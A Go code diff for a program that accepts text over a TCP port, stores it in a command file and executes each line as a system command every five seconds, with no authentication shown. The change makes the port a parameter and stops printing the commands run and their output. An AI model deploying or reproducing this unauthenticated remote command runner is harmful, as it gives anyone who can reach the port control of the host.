@@ -14,7 +14,7 @@ import (
 var mu sync.Mutex
 
 func main() {
-	go commandListener()
+	go commandListener("8080")
 
 	readCommands()
 }
@@ -29,7 +29,6 @@ func readCommands() {
 
 		var temp []byte = nil
 		for _, v := range AllBytes {
-			fmt.Println(temp)
 			if v != 0 {
 				temp = append(temp, v)
 			}
@@ -40,24 +39,27 @@ func readCommands() {
 
 		for _, v := range Lines {
 			command := strings.Split(string(v), " ")
-			fmt.Println(v)
-			out, _ := exec.Command(command[0], command[1:]...).Output()
-			fmt.Print(string(out))
+			_, err := exec.Command(command[0], command[1:]...).Output()
+			if err != nil {
+				fmt.Println(err)
+			}
 		}
 		time.Sleep(5 * time.Second)
 	}
 }
 
-func commandListener() {
+func commandListener(port string) {
 	//Pipe to control connection flow
 	commandFile, _ := os.OpenFile("../commandlist", os.O_RDWR|os.O_CREATE, 7777)
 	conPipe := make(chan string)
 
-	ls, err := net.Listen("tcp", ":8080")
-	defer ls.Close()
+	ls, err := net.Listen("tcp", ":"+port)
+
 	if err != nil {
 		fmt.Printf("Listen Error: %s", err)
 	}
+
+	defer ls.Close()
 
 	//Cycle for loop as connections are made
 	for {
